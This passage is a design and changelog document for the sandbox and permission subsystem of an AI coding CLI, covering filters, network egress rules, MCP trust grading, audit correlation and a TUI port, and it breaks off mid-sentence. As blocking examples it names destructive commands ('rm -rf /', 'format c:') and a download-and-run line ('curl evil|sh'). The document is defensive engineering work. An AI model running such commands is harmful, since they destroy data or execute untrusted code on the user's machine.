# Tuan-CLI Safety Subsystem

> This document is the authoritative description of the safety subsystem: architecture, module boundaries, decision tree, audit loop, threat model, and enhancement roadmap.
> Goal: Make "what is allowed, what is rejected, and why" quickly verifiable outside the code, and provide a consistency anchor for future enhancements.

---

## 1. Design Principles

- **Fail-closed**: When the filter itself fails, confirmation channel is missing, strong isolation backend is unavailable, or parameter parsing throws an exception → everything is rejected, never silently allowed.
- **Auditable**: Every safety decision (especially blocks) should flow into the audit stream for offline accountability.
- **Deterministic first**: Intent/trust/rule static determinations should hold without any kernel/container; without strong isolation, use filters as fallback, not bare execution.
- **Unified entry, no side doors**: All tools go through the same safety pipeline, avoiding bypass paths like "skipping run_shell guard via file write/MCP".

---

## 2. Overall Architecture

```
                    Tool/Command Request
                          │
        ┌─────────────────▼────────────────────┐
        │  L0 Intent Filter  IntentFilter       │ Redline/exfiltration/remote execution
        ├──────────────────────────────────────┤
        │  L1 Trust Filter   TrustFilter        │ Workspace trust / domain whitelist / plan mode
        ├──────────────────────────────────────┤
        │  L2 Resource Filter ResourceFilter    │ Network switch / memory timeout / isolation trigger
        ├──────────────────────────────────────┤
        │  L3 Hard Isolation Filter             │ Backend auto-selection / fail-closed
        │  HardIsolationFilter                  │
        └──────────────────────────────────────┘
                          │   Verdict (ALLOW/CONFIRM/ISOLATE/DENY)
                          ▼
             ┌ Allow ┬ Confirm ┬ Isolated Execute ┬ Deny ┐
             └───────┴────────┴─────┬─────────────┴─────┘
                           Copy/diff/apply or hard isolation backend
                          │
                          ▼
               SecurityAuditor / SecurityEventBus
               (AEAD-logged, tamper-proof chain, real-time alerts)
```

- Main pipeline: [`tuan_cli/sandbox/`](tuan_cli/sandbox/) (`SandboxManager` unified entry).
- Tool execution gate: [`tuan_cli/core/tool_executor.py`](tuan_cli/core/tool_executor.py) (`_security_gate_check` + `_sandbox_gate_check`).

---

## 3. Four-Layer Sandbox Filters

| Layer | Module | Responsibility | Verdict |
|-------|--------|---------------|---------|
| L0 Intent | `sandbox/filters.py::IntentFilter` | Hard redline (`rm -rf /` / `format c:`), data exfiltration, remote execution → deny-critical/high | Model-agnostic, most deterministic |
| L1 Trust | `sandbox/filters.py::TrustFilter` | Workspace trust grading (trusted/limited/untrusted/unknown) + domain whitelist + plan mode | trusted → pass / untrusted → deny / unknown → confirm |
| L2 Resource | `sandbox/filters.py::ResourceFilter` | **Opt-in** no-network switch (`sandbox.resource.deny_network_by_default`, default **off**); high-risk write → copy-diff-apply | Determines "whether to use L3" |
| L3 Hard Isolation | `sandbox/filters.py::HardIsolationFilter` | Backend auto-selection; needs hard isolation but no backend available → **fail-closed deny** | Real container/OS isolation |

**Isolation backend auto-selection** (strength descending): `landlock → docker → seatbelt → token-acl → jobobject → local`. See `sandbox/backends.py`.

**Workspace isolation fusion mode**: `direct` (path-limited direct write, low risk) + `copy-diff-apply` (copy → diff → confirm → apply, high risk with rollback). See `sandbox/isolation.py`.

**Decision model**: `sandbox/verdict.py::Verdict`, actions strictly ordered by severity `ALLOW < CONFIRM < ISOLATE < DENY`, tightening across layers.

---

## 4. Safety Module Responsibilities & Boundaries

| Module | File | Responsibility Boundary |
|--------|------|------------------------|
| Redline Engine | `ext/safety_engine.py` | Command/SQL/write operation static risk scoring; hard redline/soft redline/benign judgment |
| Safety Gate | `ext/security_gate.py` | Unified `SecurityGate`: shell/MCP tools/remote prompts/file writes/unknown kinds |
| Rules Engine | `ext/rules_engine.py` | YAML rule loading and validation; ReDoS protection; secret detection |
| Safety Policy | `ext/security_policy.py` | Blacklist/policy monthly update reminders |
| Crypto Engine | `ext/crypto_engine.py`, `harden/crypto_provider.py` | PBKDF2+AES-GCM/CTR+HMAC; pluggable backend; decryption authentication failure → fail-closed |
| Network Guard | `core/network_guard.py` | Network command identification; sensitive domain/IP/CIDR/one-way mode (egress policy authority) |
| Auditor | `core/security_auditor.py` | AEAD-encrypted logging, tamper-proof chain, query/stats/export |
| Event Bus | `core/security_bus.py` | Unified event routing; includes sandbox events (`security.sandbox.*`), real-time alerts |
| Workspace Trust | `core/workspace_trust.py` | `trusted/limited/untrusted/unknown` grading and persistence |
| Whitelist | `core/whitelist.py` | Read-only command whitelist, confirmation codes, multi-stage confirmation |
| MCP Hardening | `tools/mcp/security.py` | Registration description scanning, parameter injection detection (independent threat class) |
| Permission Rules | `tools/permissions.py` + `permission_fusion.py` | `permissions.rules` rule table / shell / network policy decisions |
| Sandbox Unified Entry | `sandbox/manager.py` | Four-layer filter evaluation + audit loop + isolation execution routing |

---

## 5. Key Decision Trees

### 5.1 Network Egress (Authority = `NetworkGuard.check`)
- **L0 Intent Filter**: Consumes `guard.check().action == "deny"` (exfiltration/remote execution/sensitive domain/port scan/CIDR violation) → sandbox deny high. **Does not** enforce whitelist.
- **L1 Trust Filter**: Enforces **domain whitelist** (`payload.meta.allowed_domains` ← `sandbox.allowed_domains` / `permissions.network.allow_domains`).
- **L2 Resource Filter**: Handles **existence + no-network switch**: if a network request is detected **and** `deny_network_by_default` is enabled → `network=False + isolate=True` (air-gapped execution). **The switch is off by default** — outbound access is not disabled out of the box; see `SECURITY_BASELINE.md` for the production configuration. A failure inside the network-probe now fails closed (treated as "network requested"). Local commands unaffected.

> Consistency contract: Commands denied by `NetworkGuard` must be denied by sandbox L0 with consistent severity (high).

### 5.2 Trust Grading
- `unknown` → confirm; `untrusted` → deny; `limited` → confirm outside whitelist; `trusted` → pass.
- Plan mode (plan_mode) always downgraded to "read-only confirmation".

### 5.3 MCP Checkpoints (Two Complementary Threats)
- **Redline layer** (command-level fatal): `SecurityGate.decide_mcp_tool`; without gate fallback `_is_mcp_dangerous` → both **full-field recursive redline, consistent coverage**.
- **Injection layer** (instruction override/role hijack): `MCPSecurityGuard.scan_tool_params` → independent interception.
- Two classes don't eat each other; they are division of labor in defense-in-depth, not duplication.

---

## 6. Audit Loop

- Every sandbox verdict (DENY full; CONFIRM/ISOLATE high-severity and above) flows through `SandboxManager._emit_audit`:
  - `SecurityAuditor`: AEAD-encrypted logging + tamper-proof chain (with layer/tool/trust/backend context).
  - `SecurityEventBus`: `security.sandbox.blocked/isolated/confirmed` → `security-audit.jsonl` + critical/high real-time alerts + export.
- Audit is supplementary protection: any audit anomaly is swallowed, **never** affects the sandbox main pipeline.
- Export formats: JSONL / CEF / RFC5424 Syslog (`harden/audit_export.py`).

---

## 7. Threat Model (Covered)

| Threat | Defense | Status |
|--------|---------|--------|
| Fatal command destroys host | L0 Intent Filter / Redline Engine / Hard isolation backend | ✅ |
| Untrusted code outside workspace | Workspace trust grading + path boundary + copy mode | ✅ |
| Data exfiltration / remote execution | NetworkGuard + L0 + L2 no-network isolation | ✅ |
| MCP malicious server parameter injection | Registration description scanning + parameter injection detection + full-field redline | ✅ |
| Prompt injection (instruction override) | Injection detection layer (independent of redline) | ✅ |
| Audit tampering / plaintext leakage | AEAD encryption + tamper-proof chain | ✅ |
| Filter/backend failure bypass | Full-stack fail-closed | ✅ |

---

## 8. Enhancement Roadmap (Prioritized by Value)

| # | Module | Enhancement Direction | Status |
|---|--------|----------------------|--------|
| E1 | `tools/mcp/policy.py` + `security.py` | MCP **server trust grading**: persist each server's permission domain (read-only/tool whitelist/allowed domains) to persistent policy; add "pre-call tool-level authorization + in-session revocable" to replace scattered ad-hoc confirmations | ✅ Done |
| E2 | `core/workspace_trust.py` | Trust **auto-decay and re-validation**: trusted auto-downgrades to limited when directory changes or new sensitive files (.env/.git config/keys) appear, prompting re-review | ✅ Done |
| E3 | `sandbox/backends.py` + `arch/platform.py` | **Job Object resource quota enforcement**: CPU quota, memory limit, process tree kill timeout fallback (currently only existence probe) | ✅ Done |
| E4 | `core/security_auditor.py` + `harden/audit_export.py` | Audit **correlation/consolidation + cross-session anomaly detection**: aggregate alerts for repeated same-source redlines (e.g., MCP repeated injection); export supports rotation and encryption | ✅ Partial (correlation + rotation done; export encryption not done) |
| E5 | `core/tool_executor.py` | **Write storm detection**: high-frequency write/delete in single session triggers throttling and alerts, preventing batch accidental deletion | ✅ Done |
| E6 | `tools/permissions.py` | `permissions.rules` enhancement: **negative glob** (`!bin/**`), MCP tool name rules, in-session temporary authorization elevation | ◐ Partial (first two done) |
| E7 | `sandbox/isolation.py` + `ui/approval_overlay.py` | Copy mode **diff visualization confirmation**: display changes via CLI/interactive card before applying | ✅ Done (backend + approval card) |
| E8 | `config` | `sandbox`/`permissions` config **schema strict validation + fail-closed observability** (enabled/degraded items visualization) | ✅ Done |

> Priority judgment: High priority and independently evolvable → **E2, E3, E5** (done); depends on interaction design → **E1, E7** (backend + approval card done); polish/hardening → **E4, E6, E8**.

**E2 implementation note (2026-11-06):** `check_for_decay()` / `apply_decay()` were
previously invoked only by unit tests; both the CLI (`cli/cmd_chat.py`) and the Web
API (`web/server.py::trust_status`) read `record.level` directly, so decay never
took effect in the main path. `check_trust()` now performs the decay check itself,
keeping CLI / Web / sandbox on the same level:

- A fingerprint baseline (top-level directory names + sensitive file path/size/mtime_ns)
  is persisted when trust is confirmed. Any later change (.env, keys, `.git/config`,
  new top-level directory) downgrades to `limited` and asks for re-confirmation.
  Scanning is bounded (depth 4 / 20k entries / dependency dirs skipped) and never
  reads file contents, so ordinary source edits do not trigger it.
- **Fail-closed:** a failed scan (missing directory, permission error, entry limit) no
  longer silently returns "no change"; it downgrades to `limited`. Legacy records
  without a fingerprint only build a baseline, avoiding startup false positives.
- `last_used` is now maintained by `check_trust` (60 s write throttle), fixing active
  workspaces being misclassified as stale after 30 days.
- Decay reason / timestamp are persisted and surfaced via `get_project_info()`.
- Regression suite: `tests/test_e2_e5_hardening.py` (16 cases).

**E5 implementation note:** `_WriteStormDetector` was already wired into `ToolExecutor`,
but the unique-file count accumulated over the whole session, so once 15 distinct files
were touched the alert never cleared despite the 60 s sliding window. File and count
dimensions now share one window, the alert flag expires with it, and the message no
longer mislabels the write count as seconds.

**E6 partial implementation note (2026-11-06):** `PermissionPolicy.match_rule()`
now supports negative exclusion (`exclude: "git push --force*"` or
`pattern: "!git push --force*"`): a matching target disables that rule, so a
broad allow can carve out dangerous cases instead of becoming a standing
escalation path. **deny rules ignore `exclude`** (fail-closed — a denial must
not be widened), and priority remains deny > ask > allow. MCP calls are
normalized to `mcp__<server>__<tool>`, enabling per-server rules such as
`{"tool": "mcp__untrusted__*", "action": "deny"}`. In-session temporary
authorization elevation is still TODO. Regression: `tests/test_e6_e8_hardening.py`.

**E8 implementation note:** new `config/security_schema.py` brings `sandbox` /
`permissions` under strict validation; `config/validate.py` previously checked
only model/agent/context fields. The dangerous failure mode is *silent*
misconfiguration: `match_rule()` skips non-dict rules and unknown actions, and
`sandbox.enabled=false` short-circuits all four filter layers. These now surface
as explicit errors in `tuan config validate` and in the "security config schema"
section of `tuan harden status`. Missing fields are quiet (DEFAULT_CONFIG supplies them).

**R8 — another exception-as-allow fix:** `PermissionPolicy._hardening_confirm()`
used `except: pass` when the safety engine failed to import, then continued to
YOLO auto-approve. Overlong commands, FD redirects, PowerShell IEX and Docker
daemon redirects were all silently allowed whenever the engine was unavailable.
It now returns `confirm` with a fail-closed reason.



**E3 implementation note (2026-11-06):** the most valuable fix is not "adding
a CPU quota" but stopping *degradation being reported as enforced*.
`SandboxManager._run_syscall()` hardcoded `enforced=True`; as long as the
platform layer did not raise, an internal fallback to a plain subprocess (missing
libseccomp / Job Object unavailable) was still reported to callers as OS-level
isolation. `SyscallResult` now carries `enforced` / `degraded_reason`, every
fallback path sets `enforced=False`, and `enforce_required` decides whether to
reject.

  - `arch/platform.py`: new `JobObjectLimits` pure data layer (range checks,
    unit conversion); `_set_job_limits()` issues two `SetInformationJobObject`
    calls — class 9 for memory/workingset/process count, class 15 for the CPU
    hard cap (`ENABLE|HARD_CAP`; `CpuRate` = percent x 100). The old code never
    used `cpu_rate_pct` at all, and `MaximumWorkingSetSize` lacked
    `JOB_OBJECT_LIMIT_WORKINGSET` so it had no effect.
  - **Fail-closed:** `AssignProcessToJobObject` failure used to be a silent
    `pass` while still returning `mechanism="job-object"`. Now the child is
    killed and `blocked=True / enforced=False` is returned. Any quota setup
    failure raises instead of running without quotas.
  - Process-tree kill fallback chain: `TerminateJobObject` -> `taskkill /T /F`
    -> `proc.kill()`.
  - `backends._jobobject_available()` now performs a real `CreateJobObjectW` +
    `QueryInformationJobObject` capability probe instead of merely checking
    `sys.platform == "win32"`.
  - New config keys `sandbox.resource.cpu_rate_pct / active_process_limit /
    kill_timeout_seconds`, validated by `tuan config validate`.
  - **Limitation (stated plainly):** Job Object applies to Windows only. This
    environment is Linux; the Windows path is covered by fake-kernel32 /
    fake-Popen unit tests and has **not been executed on a real Windows host**.
    Linux/macOS still need an external container/VM; `enforced=False` makes
    degradation visible, it does not add isolation.

**E4 implementation note (partial):** new `core/audit_correlation.py`.
Audit records were previously per-event — 1000 `deny` lines looked the same as
one, so repeated same-source injection was invisible.

  - `AuditCorrelator` emits three alert kinds: `burst` (repeated same-source
    hits in a window), `cross_session` (same fingerprint in >= 2 sessions,
    catching cross-session poisoning / prompt-injection reuse), and
    `severity_escalation` (low -> critical on the same source). Fingerprints
    exclude session/seq/ts and normalise away paths and digits.
  - **Pure observation, never affects decisions:** does not modify
    `AuditRecord`, never returns allow/deny, swallows all exceptions; alerts
    are published only to an *already existing* global event bus.
  - `SecurityAuditor` replays AEAD log history at startup so cross-session
    detection survives process restarts; exposed via `recent_alerts()`,
    `correlation_stats()` and `stats()["correlation"]`.
  - `harden/audit_export.py` gains size-based rotation (`max_bytes` /
    `backup_count`) and 0600 permissions; `export_file()` replay is covered too.
  - **Still TODO:** export encryption. The main audit log is AEAD-encrypted,
    but SIEM export files need an independent key-management design.
  - Regression: `tests/test_e3_jobobject.py` (25) and
    `tests/test_e4_correlation.py` (24).



**E1 implementation note (2026-11-06):** new `tools/mcp/policy.py`.
`mcp/security.py` only scanned tool descriptions/params for injection (content
layer); it never answered "what is this server actually allowed to do". Every
MCP call was a blanket allow/deny on the outer `mcp_call` tool.

  - `MCPPolicyStore` persists each server's permission domain: `tier`
    (untrusted/limited/readonly/trusted), `read_only`, `tool_allowlist`,
    `tool_denylist`, `allowed_domains`, `max_calls_per_session`,
    `require_confirm`; atomic write to `~/.tuan/mcp_server_policy.json` (0600).
  - **Default untrusted:** an unregistered server is denied, not temporarily
    allowed just because it is new. `trusted` tier REQUIRES an explicit
    tool_allowlist, rejecting "no list = allow everything".
  - **deny wins**, domain allowlist (including nested URL params), per-session
    call quota, and **in-session revocation** (`revoke_session()` takes effect
    immediately, no restart).
  - **Corrupt = locked:** a damaged/unknown-version policy file locks all MCP
    calls instead of being rebuilt as an empty policy. An empty policy looks
    like "no restrictions", which is the opposite of "unverifiable".
  - **Wiring (key):** `build_permission_policy()` injects the global store so
    the main `mcp_call` path really goes through trust grading; unit tests that
    construct `PermissionPolicy` directly are unaffected. If the policy layer
    fails to initialise, a `_DenyAllMCPPolicy` is injected instead of silently
    falling back to the bare path. New config key `mcp.policy.enabled`
    (default on) is covered by E8 validation; disabling it is reported as a
    security downgrade.
  - **TUI card done:** `request_grant()` presents the full permission domain
    (tier / allowlist / denylist / domains) via `ui/approval_overlay.py` and
    routes an explicit decision. "This session only" uses an in-memory policy
    (never written to disk); only "grant and persist" calls `grant()`. Deny /
    abort / channel failure never change policy. See the Codex attribution
    note below.

**E7 implementation note (2026-11-06):** two findings mattered far more than
"adding a preview".

  1. **`copy_diff_apply` was a documentation-only feature.** The L2 filter set
     `verdict.workspace_mode = "copy_diff_apply"` on high severity and put it
     into the audit context, but `SandboxManager.execute_isolated()` never read
     that field. `isolate_workdir` / `diff` / `apply` had ZERO production call
     sites — high-risk commands still ran directly in the real workspace. It
     is now dispatched on `workspace_mode`: the command really runs in an
     isolated copy, and only writes back after preview + confirmation.
  2. **Snapshot skipped hidden directories, so the confirmation UI lied.**
     `Snapshot.capture()` used `not d.startswith(".")`, so editing
     `.github/workflows/ci.yml` in the copy produced an EMPTY `diff()` — the
     user saw "no changes". Reproduced and fixed: only `_IGNORED` dirs and the
     sandbox copy itself are skipped now.

  - New `DiffPreview` / `DiffEntry`: each change carries path/status/before and
    after sizes, a **first-20-lines content preview** (so the user can see
    whether that line is `curl evil|sh`, not just the filename), a binary
    marker, and `[!sensitive]` highlighting for .env / keys / credentials.
    `to_text()` renders plain text for CLI or a TUI card.
  - `confirm_apply()` fail-closed contract: missing/raising/false `confirm`
    never writes back; **TOCTOU re-check** rejects if the copy changed during
    confirmation. No snapshot cache is introduced — judgement must not depend
    on a filesystem point in time.
  - `SandboxExecResult` gains `workspace_mode` / `applied` / `applied_files` /
    `diff_preview` / `confirm_reason`; on rejection the preview is included in
    `error` so the user still sees what would have changed. The copy is always
    cleaned up in `finally`.
  - **TUI card done:** `confirm_apply()` accepts a `card_renderer`; the
    structured approval card is rendered by `ui/approval_overlay.py`. With
    `ctx.confirm` it goes to the existing TUI pending-confirm channel; without
    one, a headless default channel is provided (print card + exact 6-char
    confirmation code + stdin; non-TTY / EOF -> ABORT). **Behaviour change:**
    the previous "no confirm channel -> immediate failure" headless gap is
    closed, but fail-closed is NOT relaxed — the default channel equally
    demands an explicit decision.
  - **Limitations (stated plainly):** the TUI reuses the existing `confirm()`
    text-box channel; the prompt_toolkit app was NOT replaced with a
    ratatui-style Widget/Buffer architecture (see the attribution note below).
    The TUI path uses y/n (`_resolve_confirm`) and does NOT display a
    confirmation-code hint, so card wording and channel behaviour agree —
    no "card says a code is required but y is accepted" mismatch. When
    combined with a strong OS backend, the backend runs inside the copy's cwd;
    the Windows Job Object combination has not been verified on a real
    Windows host (same limitation as E3).
  - Regression: `tests/test_e1_e7_hardening.py` (39 cases),
    `tests/test_tui_approval_overlay.py` (59 cases).



**Codex TUI attribution note (2026-11-06):** per request, the `openai/codex`
TUI source was **downloaded and inspected in full locally** (`codex-rs/tui/`,
Rust + ratatui + crossterm + tokio, 165 top-level modules, 1216 `.rs`
   files, 492414 lines; 1491 snapshot files skipped). Its
`LICENSE` and `NOTICE` are reproduced **verbatim** in `THIRD_PARTY_LICENSES/`
(Apache-2.0 section 4 and the upstream NOTICE requirement).

**No Rust TUI source was copied verbatim, and this project does not claim it
was.** Two hard reasons:

  1. **Cross-language:** `codex-tui` is a standalone Rust crate whose rendering
     rests on ratatui `Widget`/`Buffer` traits and a crossterm event loop;
     Tuan-CLI is pure Python + prompt_toolkit/rich. Literal 492k lines of
     Rust have no executable meaning inside a Python repository.
  2. **Replacing the TUI shell would re-open the side doors:** permission
     policy injection (`build_permission_policy`), the confirmation channel
     (`ctx.confirm`) and sandbox routing (`_route_sandbox_isolation`) all hang
     off the existing TUI entry point. Swapping the shell would discard every
     E1-E8 wiring fix — exactly the failure mode those rounds were closing.

What was done instead is an **equivalent port of the interaction shell**:
the component layering of `bottom_pane/approval_overlay.rs`
(`ApprovalRequest` -> option list -> explicit decision event -> routing) and
its four interaction contracts are independently implemented in Python and
**inlined** into `tuan_cli/ui/approval_overlay.py`. Card layout reuses Tuan's
existing `_render_confirm_card` / `_render_ask_card` box renderer; ratatui is
not introduced.

Four borrowed contracts (all implemented and regression-covered):
  1. a selection always emits an explicit decision event (no "absence of
     input means consent");
  2. Esc / cancel always maps to Cancel/Abort — upstream guarantees this for
     MCP elicitation so dismissal never becomes "continue without info";
     here ABORT takes priority over confirmation-code validation;
  3. the UI never evaluates safety — upstream: "This module does not evaluate
     whether an action is safe to run; it only presents choices and routes
     user decisions." Safety remains with the E1 policy store and E7
     `confirm_apply`;
  4. scope distinction (`Accept` / `AcceptForSession`) -> `ONCE` / `SESSION`.

Modifications relative to upstream are recorded too: Python dataclass request
model; fail-closed decision parsing (unknown -> RETRY, wrong code -> DENY,
non-TTY headless -> 6-char code, unavailable stdin -> ABORT); new E1
persistent trust-grant flow and E7 structured DiffPreview card, neither of
which exists upstream. Attributions, full license text and the "OpenAI does
not endorse" statement are in `NOTICE` section 9.



**TUI parity matrix (2026-11-06, round 10):** the goal "TUI completely
identical to Codex, with local localization" is now broken into measurable
items; see `TUI_PARITY.md` and `tuan tui parity`.

  - New `tuan_cli/tui/parity/`: `upstream_spec.py` (165-module tree / layout
    constants / key-spec normalization), `keymap.py` (Codex
    `built_in_defaults`: 8 contexts / 82 actions / 74 bound, plus
    `RuntimeKeymap` with context->global->defaults precedence, explicit
    unbind, uniqueness conflicts, reserved `ctrl-c`), `i18n.py` (17 strings
    -> 10 languages, en / zh-CN complete), `matrix.py` (per-module status
    and gap queue).
  - **Keys switched to Codex native:** `y` approve / `a` for session /
    `p` for prefix / `d` deny / `n` decline / `c` cancel; new `PREFIX` and
    `DECLINE` decisions added. Previous `s` / `1` / `2` remain as localized
    compatibility aliases. `Esc` stays `ABORT` (stricter than upstream's
    exec-mode decline; disclosed in TUI_PARITY.md section 6).
  - **Layout constants match value-for-value:** LIVE_PREFIX_COLS=2,
    MAX_POPUP_ROWS=8, MIN_LIST_WIDTH_FOR_SIDE=40, SIDE_CONTENT_GAP=2,
    MENU_SURFACE_HORIZONTAL_INSET=4, MAX_KEY_CHORD_STROKES=2.
  - **Scale correction:** a full extraction yields 165 modules / 1216 `.rs`
    files / 492414 lines (1491 snapshots skipped), not the earlier
    567 / 247k. Every reference to the old figures has been corrected.
  - **Current metrics (no inflation):** aligned 14, localized 57,
    not_applicable 63, **pending 31**; broad coverage 81.2%, strict
    alignment 43.0%, **value-for-value alignment only 8.5%**;
    `fully_identical = false`. `tuan tui parity --gaps` lists the 31
    remaining modules and TUI_PARITY.md section 5 gives the round 11-15
    plan to zero them. Status definitions are NOT loosened to inflate
    numbers.
  - **Localization boundary:** keys / layout / component tree / interaction
    contracts are unchanged (these are the anchors of "completely
    identical"); only strings, models, paths, palette, render backend and
    approval-scope semantics are localized.
  - Regression: new `tests/test_tui_parity.py` plus existing
    `test_tui_approval_overlay.py` / `test_e1_e7_hardening.py` adapted to
    Codex keys, 102 cases passing.
  - Attribution: `NOTICE` section 10, `TUI_PARITY.md` section 8;
    **still no Rust source copied verbatim**.

  **Input / terminal capability alignment layer (2026-11-06, round 11):**
  all 7 pending modules in the `input_keymap` group are now cleared.
  `tuan tui parity` metrics: aligned 21 / localized 57 / n/a 63 /
  **pending 24**; broad 85.5%, strict 47.3%, **value-for-value 12.7%**;
  `fully_identical` remains `false` (reported honestly).

  - New `tuan_cli/tui/inputkit/` (pure Python, zero Rust source):
    `vim_search` (literal matching + complete graphemes),
    `activation_key_guard` (dual 1s windows + Press/Repeat/Release state
    machine), `copy_input_guard` (RAII release, **also on exception
    paths**), `custom_terminal` (double-buffer diff, single row-tail
    `ClearToEnd`, `AlwaysUpdate` retention, wide-glyph tail invalidation,
    BSU/ESU synchronized frames, Drop cursor restoration),
    `terminal_program_status` (OSC 7501/21337, VTE 5400 threshold,
    dedup cache, `;`/`\` escaping), `terminal_hyperlinks` (8192-byte
    cap, 17-entry extension allowlist, canonicalize containment,
    symlink rejection, image magic probing, OSC 8 bytes excluded from
    geometry), `terminal_visualization_instructions` (feature gate +
    Chinese default, ASCII-only constraint preserved).
  - **Local security hardening (STRICTER than upstream, not a relaxation):**
    `web()` adds an http/https scheme allowlist and rejects OSC/BEL
    control characters (upstream `web()` performs no validation);
    terminal status uses a **no-op writer by default** and emits NO
    escape sequences unless `configure()` is called; detail text is
    sanitized and length-capped before escaping; workspace-file
    validation fails closed on symlink ancestors. This closes the
    "terminal interprets OSC sequences" attack surface.
  - **Special MIT attribution:** upstream `custom_terminal.rs` explicitly
    states it is derived from `ratatui::Terminal` under the MIT License
    (Florian Dehau / The Ratatui Developers). `NOTICE` section 11 and
    TUI_PARITY.md section 8 record the dual attribution; the MIT text is
    in THIRD_PARTY_LICENSES/Codex-NOTICE.txt.
  - **Localization disclosed honestly:** grapheme segmentation uses a
    stdlib `unicodedata` UAX #29 *approximation* and is NOT claimed
    byte-identical to Rust `unicode-segmentation`; kitty / sixel image
    protocols are not implemented (`not_applicable`), with the field kept
    empty rather than faking support.
  - Regression: `tests/test_tui_input_layer.py` **88 cases** pass; the
    previous round's metric assertions were synced to 24 / 85.5% /
    47.3% / 12.7% and gained a derived-consistency check so status
    definitions cannot be loosened unnoticed.
  - Next round: the 9 `core_app` modules (`app_event` / `chatwidget`
    state machine and event routing), **preserving the existing
    permission-policy injection and sandbox wiring**.

  **Application-core alignment layer (2026-11-07, round 12):** all 9
  pending modules in the `core_app` group are cleared. `tuan tui parity`
  metrics: aligned 30 / localized 57 / n/a 63 / **pending 15**; broad
  90.9%, strict 52.7%, **value-for-value 18.2%**; `fully_identical`
  remains `false` (reported honestly).

  - New `tuan_cli/tui/corekit/` (pure Python, zero Rust source) with 9
    modules: `app` (32768 channel capacity / AppRunControl / ExitReason /
    resumability), `app_backtrack` (six-step Esc/Enter state machine +
    base_id invalidation), `app_command` (Redacted newtype / typed
    commands / proof excluded from recording), `app_event` (typed events /
    Ops not double-logged / classification enums), `app_event_sender`
    (voice_only allowlist / swallowed errors / 10 convenience methods),
    `app_info` (explicit wire-to-domain conversion with 15/6/11/1/3
    fields), `chatwidget` (committed + active cell / cached live tail /
    dual-lifecycle busy), `cli` (public vs skip flags / two approval
    conflicts), `resize_reflow_cap` (1000/9001/3500/10000 caps /
    tri-state / VS Code probe priority).
  - **Three highest-value security contracts:**
    1. **Redacted newtype.** Upstream keeps ICE credentials and spoken
       answers out of diagnostics and session recordings (Debug and
       Serialize both emit `<redacted>`; plaintext only at the signaling
       boundary). Localization is stricter: repr / str / f-string /
       to_dict / equality are all redacted, and `reveal()` is the ONLY
       exit, with an audit counter.
    2. **Approval conflicts fail closed.** `mark_tui_args` makes
       "dangerously_bypass_approvals_and_sandbox" AND "auto_review"
       conflict with "approval_policy". Silent coexistence would be a
       configuration back door: the user thinks an approval policy is
       set while a bypass switch swallows it. This round returns
       structured problems and refuses startup; wired into
       `corekit_validate()`.
    3. **Existing security wiring protection (explicit requirement).**
       `app.assert_wiring_intact()` really imports the pre-existing
       modules and verifies SIX invariants: `build_permission_policy`
       injection, `_DenyAllMCPPolicy` returning deny, the `ctx.confirm`
       channel, `make_confirm_callable` card wiring, `confirm_apply`
       copy-mode confirmation, and `ABORT` being an explicit decision
       (no input / Esc can never become approval). It is wired into
       `corekit_validate()`, `parity_validate()` and the regression
       suite. **NO existing runtime object was replaced.**
  - Two further correctness points: `bind_thread()` invalidates stale
    selections and `confirm_revert()` re-checks the thread, preventing
    a revert from session A landing on session B; chatwidget derives ONE
    busy indicator from TWO independent lifecycles
    (`agent_turn_running` and `mcp_startup_status`) so MCP startup
    cannot be misreported as idle and trigger duplicate submissions.
  - **Local security hardening (STRICTER than upstream):** bounded event
    queue (reject + count when full), unknown event names excluded from
    inbound logging, strict `app_info` field allowlist with http/https
    URL validation, `SubmitThreadOp` without a thread id rejected, and
    illegal resize limits failing closed to the conservative fallback.
  - **Boundaries disclosed:** OpenAI-only capabilities (realtime voice,
    cloud submission, connectors, plugins, daemon, worktrees) are
    marked `not_applicable` / not implemented, with variant names kept
    ONLY to keep the voice_only allowlist contract verifiable;
    `MAX_REPLAY_TRANSCRIPT_CELLS` depends on an upstream constant with
    no local counterpart, so the fallback uses an explicit local
    default 1000 and `MAX_PENDING_TRANSCRIPT_CELLS=8` — neither is a
    copied value.
  - Regression: `tests/test_tui_core_app_layer.py` **76 cases** pass;
    `test_tui_parity.py` metrics synced to 15 / 90.9% / 52.7% / 18.2%
    with the derived-consistency checks retained.
  - Next round: `config_models` + `misc` (5), then `streaming_async` +
    `tools_exec` + `history_transcript` (5), **still preserving the
    existing security wiring**.

  **Configuration / sidebar alignment layer (2026-11-07, round 13):**
  all 5 pending modules in `config_models` + `misc` are cleared.
  `tuan tui parity` metrics: aligned 35 / localized 57 / n/a 63 /
  **pending 10**; broad 93.9%, strict 55.8%, **value-for-value 21.2%**;
  `fully_identical` remains `false` (reported honestly).

  - New `tuan_cli/tui/configkit/` (pure Python, zero Rust source) with 5
    modules: `additional_dirs` (4 early-return branches, verbatim warning
    template, ignore-means-reject), `collaboration_modes` (tui_visible
    filter, 2s discovery, failure never masquerading as empty),
    `model_migration` (three-state Outcome, mandatory vs opt-out keyboard
    policies, single-pass template substitution), `sidebar_chooser`
    (`WIDE_WIDTH=58`, narrow two-line layout, `choice_at` hit-test),
    `sidebar_tab_strip` (three-state TabState, `targets()` geometry,
    add-first hit-test).
  - **Three highest-value fixes (all measured, none merely "alignment"):**
    1. **Chained `replace` double substitution.** Upstream
       `fill_migration_markdown` does
       `.replace("{model_from}", current).replace("{model_to}", target)`.
       If `current_model` contains the literal `{model_to}` (model names
       come from server/config and can be polluted), it is replaced a
       SECOND time by `target_model`. Measured: template
       "从 {model_from} 迁移到 {model_to}" with current
       "old-{model_to}-x" and target "NEW" yields
       "从 old-NEW-x 迁移到 NEW" upstream. This round uses ONE regex pass
       so replacement values never participate in later matching; unknown
       `{...}` placeholders are preserved, not swallowed.
    2. **Discovery failure is not silently empty.** Upstream `list()`
       collapses timeout / RPC error / protocol error into ONE empty Vec
       plus a warn ("Missing discovery adds no presets"). A caller cannot
       tell "not queried" from "queried, none", so a network error silently
       becomes "no mode picker needed". `DiscoveryResult` distinguishes
       ok / empty / unavailable / timeout / protocol_error; `usable`
       permits ONLY ok and empty, forcing explicit handling of failure.
    3. **`--add-dir` is not silently dropped.** Upstream returns only a
       warning STRING and leaves presentation to the caller; a forgotten
       print means the user thinks a writable root was added when it was
       ignored. `AddDirDecision` + `enforce()` turn "ignore" into a
       structured REJECT with an actionable hint, plus `..` / control-char
       / NUL / empty validation. Deliberately NO "outside cwd" check:
       adding a root outside the workspace is the whole point of
       `--add-dir`; the real boundary belongs to the sandbox layer.
  - **Two geometry-consistency contracts:** `choice_rows` (render
